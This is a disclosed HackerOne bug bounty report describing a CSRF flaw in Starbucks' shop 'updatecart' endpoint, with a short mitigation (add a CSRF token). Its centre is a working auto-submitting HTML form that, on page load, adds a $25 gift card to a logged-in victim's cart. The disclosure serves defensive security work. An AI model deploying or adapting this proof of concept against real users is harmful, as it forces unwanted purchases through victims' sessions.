# CSRF: add item to victim's cart automatically (starbucks.com - updatecart)

## Report Details
- **Report ID**: 177472
- **URL**: https://hackerone.com/reports/177472
- **State**: Closed
- **Severity**: medium
- **Submitted**: 2016-10-22T02:18:59.203Z
- **Disclosed**: 2017-06-02T16:30:07.653Z

## Reporter
- **Username**: bughuntermate
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: starbucks

## Vulnerability Information

Steps:
    1. Victim login their starbucks account first.
    2. Attacker send a form/link to victim.
    3. If victim click the form/link, An item would automatically add to victim's cart.
    4. If victim do not find this item, he/she would pay for this item which can greatly influence your repuation.

Attached is the form.


<html>
  <body>
    <form action="https://www.starbucks.com/shop/updatecart" method="POST">
      <input type="hidden" name="card&#95;custom&#95;image&#95;id" value="" />
      <input type="hidden" name="card&#95;custom&#95;theme" value="" />
      <input type="hidden" name="card&#95;id" value="db126c2c&#45;277c&#45;4208&#45;9ade&#45;e3014ba16722" />
      <input type="hidden" name="card&#95;quantity" value="1" />
      <input type="hidden" name="defined&#95;amount" value="25" />
      <input type="hidden" name="defined&#95;currency" value="USD" />
      <input type="hidden" name="greeting&#95;card" value="8779a801&#45;11e4&#45;463e&#45;bcbd&#45;8e8f7b4608ac" />
      <input type="submit" value="Submit request" />
    </form>
    <script>
      document.forms[0].submit();
    </script>
  </body>
</html>

Solution:
    Add a CSRF-token to the post form.

## Attachments
- starbuckcsrf.html
